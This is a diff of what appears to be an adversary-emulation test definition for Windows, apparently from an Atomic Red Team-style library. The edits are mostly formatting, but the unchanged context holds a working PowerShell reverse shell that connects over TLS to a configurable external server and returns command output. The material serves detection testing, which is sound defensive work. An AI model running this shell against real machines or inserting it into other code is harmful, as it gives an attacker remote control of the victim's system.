@@ -11,18 +11,16 @@ atomic_tests:
       https://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926
 
       Upon successful execution, powershell will make a network connection to 127.0.0.1 over 443.
-      
+
     supported_platforms:
       - windows
     input_arguments:
       server_ip:
-        description: 
-          IP of the external server
+        description: IP of the external server
         type: String
         default: 127.0.0.1
       server_port:
-        description:
-          The port to connect to on the external server
+        description: The port to connect to on the external server
         type: String
         default: 443
     executor:
@@ -31,7 +29,7 @@ atomic_tests:
       command: |
         $server_ip = #{server_ip}
         $server_port = #{server_port}
-        $socket = New-Object Net.Sockets.TcpClient('#{server_ip}', #{server_port})
+        $socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}')
         $stream = $socket.GetStream()
         $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
         $sslStream.AuthenticateAsClient('fake.domain', $null, "Tls12", $false)
@@ -45,6 +43,3 @@ atomic_tests:
         $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
         $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
         $sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
-      
-
-        
